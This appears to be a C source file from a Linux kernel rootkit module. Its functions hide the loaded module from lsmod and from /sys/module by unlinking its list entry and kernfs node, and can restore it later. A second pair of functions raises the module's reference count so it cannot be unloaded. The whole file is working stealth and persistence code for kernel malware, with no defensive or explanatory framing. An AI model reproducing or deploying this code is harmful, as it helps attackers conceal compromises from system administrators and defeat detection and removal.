#include "hide.h"

//********* START HIDE *********

void my_hide(void)
{
    if (is_hidden)
        return;

    while (!mutex_trylock(&module_mutex))
        cpu_relax();

    module_list = THIS_MODULE->list.prev;

    // $ lsmod
    list_del(&THIS_MODULE->list);

    kfree(THIS_MODULE->sect_attrs);
    THIS_MODULE->sect_attrs = NULL;

    // $ ls /sys/module/
    struct kernfs_node *node = THIS_MODULE->mkobj.kobj.sd;
    rb_erase(&node->rb, &node->parent->dir.children);
    node->rb.__rb_parent_color = (unsigned long)(&node->rb);

    mutex_unlock(&module_mutex);
    is_hidden = 1;
}

int nodecmp(struct kernfs_node *kn, const unsigned int hash, const char *name,
            const void *ns)
{
    /* compare hash value */
    if (hash != kn->hash)
        return hash - kn->hash;

    /* compare ns */
    if (ns != kn->ns)
        return ns - kn->ns;

    /* compare name */
    return strcmp(name, kn->name);
}

void rb_add(struct kernfs_node *node)
{
    struct rb_node **child = &node->parent->dir.children.rb_node;
    struct rb_node *parent = NULL;

    while (*child)
    {
        struct kernfs_node *pos;
        int result;

        /* cast rb_node to kernfs_node */
        pos = rb_entry(*child, struct kernfs_node, rb);

        /* 
		 * traverse the rbtree from root to leaf (until correct place found)
		 * next level down, child from previous level is now the parent
		 */
        parent = *child;

        /* using result to determine where to put the node */
        result = nodecmp(pos, node->hash, node->name, node->ns);

        if (result < 0)
            child = &pos->rb.rb_left;
        else if (result > 0)
            child = &pos->rb.rb_right;
        else
            return;
    }

    /* add new node and reblance the tree */
    rb_link_node(&node->rb, parent, child);
    rb_insert_color(&node->rb, &node->parent->dir.children);

    /* needed for special cases */
    if (kernfs_type(node) == KERNFS_DIR)
        node->parent->dir.subdirs++;
}

void my_unhide(void)
{
    if (!is_hidden)
        return;

    while (!mutex_trylock(&module_mutex))
        cpu_relax();

    // $ lsmod
    list_add(&THIS_MODULE->list, module_list);

    // $ ls /sys/module/
    rb_add(THIS_MODULE->mkobj.kobj.sd);

    mutex_unlock(&module_mutex);
    is_hidden = 0;
}

//********* END HIDE *********

//********* START PROTECT *********

void my_protect(void)
{
    if (is_protected)
        return;

    while (!mutex_trylock(&module_mutex))
        cpu_relax();

    // 使用计数+1
    try_module_get(THIS_MODULE);

    mutex_unlock(&module_mutex);
    is_protected = 1;
}

void my_unprotect(void)
{
    if (!is_protected)
        return;

    while (!mutex_trylock(&module_mutex))
        cpu_relax();

    // 使用计数-1
    module_put(THIS_MODULE);

    mutex_unlock(&module_mutex);
    is_protected = 0;
}

//********* END PROTECT *********